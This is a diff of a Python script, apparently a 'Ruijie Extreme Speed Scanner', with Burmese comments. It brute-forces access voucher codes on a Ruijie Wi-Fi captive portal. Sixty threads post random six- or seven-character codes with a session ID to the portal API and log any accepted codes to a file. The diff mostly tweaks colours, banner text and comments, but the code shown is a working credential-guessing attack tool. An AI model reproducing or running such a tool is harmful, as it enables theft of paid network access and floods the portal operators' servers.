@@ -9,11 +9,14 @@ from urllib.parse import urlparse
 from colorama import Fore, Style, init
 
 init(autoreset=True)
+
+# --- [ COLOR DEFINITIONS ] ---
 C_CYAN = Fore.CYAN + Style.BRIGHT
 C_GREEN = Fore.GREEN + Style.BRIGHT
 C_RED = Fore.RED + Style.BRIGHT
 C_YELLOW = Fore.YELLOW + Style.BRIGHT
 C_WHITE = Fore.WHITE + Style.BRIGHT
+C_RESET = Style.RESET_ALL  # ဒီနေရာမှာ Error တက်ခဲ့တာပါ၊ အခု Fix လုပ်ပြီးပါပြီ
 
 # --- [ GLOBAL STATS ] ---
 total_tried = 0
@@ -47,7 +50,7 @@ def banner(sid, api_url, threads):
     os.system('clear')
     elapsed = time.time() - start_time
     speed = total_tried / elapsed if elapsed > 0 else 0
-    print(f"{C_YELLOW}⚡ RUIJIE EXTREME SPEED SCANNER (AUTO) ⚡")
+    print(f"{C_YELLOW}⚡ RUIJIE EXTREME SPEED SCANNER (FIXED) ⚡")
     print(f"{C_WHITE}="*45)
     print(f"{C_CYAN}[GATEWAY]  : {C_WHITE}{api_url}")
     print(f"{C_CYAN}[THREADS]  : {C_WHITE}{threads} active")
@@ -57,7 +60,7 @@ def banner(sid, api_url, threads):
     print(f"{C_CYAN}[FOUND HITS]  : {C_GREEN}{found_hits}")
     print(f"{C_CYAN}[LIVE SPEED]  : {C_YELLOW}{speed:.2f} codes/sec")
     print(f"{C_WHITE}="*45)
-    print(f"{C_YELLOW}[SUCCESS CODES]:")
+    print(f"{C_YELLOW}[SUCCESS CODES (LATEST)]:")
     for code in found_list[-5:]:
         print(f" {C_GREEN}> ✅ {code}")
     print(f"{C_WHITE}="*45)
@@ -65,27 +68,31 @@ def banner(sid, api_url, threads):
 
 def scan_logic(sid, api_url):
     global total_tried, found_hits
-    # ဂဏန်းနှင့် စာလုံးအသေး ရောစပ်ခြင်း
+    # ဂဏန်းနှင့် စာလုံးအသေး (a-z) ရောစပ်ခြင်း
     chars = string.ascii_lowercase + string.digits
     while not stop_event.is_set():
+        # ၆ လုံး မှ ၇ လုံးအထိ Random ထုတ်ခြင်း
         length = random.randint(6, 7)
         code = "".join(random.choice(chars) for _ in range(length))
         try:
             total_tried += 1
-            res = requests.post(api_url, json={"accessCode": code, "sessionId": sid, "apiVersion": 1}, timeout=5)
+            payload = {"accessCode": code, "sessionId": sid, "apiVersion": 1}
+            res = requests.post(api_url, json=payload, timeout=5)
+            
             if "success" in res.text.lower() or res.status_code == 200:
                 found_hits += 1
                 found_list.append(code)
                 with open("found_vouchers.txt", "a") as f:
                     f.write(f"CODE: {code} | {time.ctime()}\n")
-        except: pass
+        except: 
+            pass
 
 def main():
     os.system('clear')
     sid, api_url = get_portal_info()
     
     if sid and api_url:
-        threads_count = 60 # အရှိန်မြှင့်ရန် Thread တိုးထားသည်
+        threads_count = 60 # အရှိန်မြှင့်ရန် Thread အရေအတွက်
         for i in range(threads_count):
             threading.Thread(target=scan_logic, args=(sid, api_url), daemon=True).start()
             
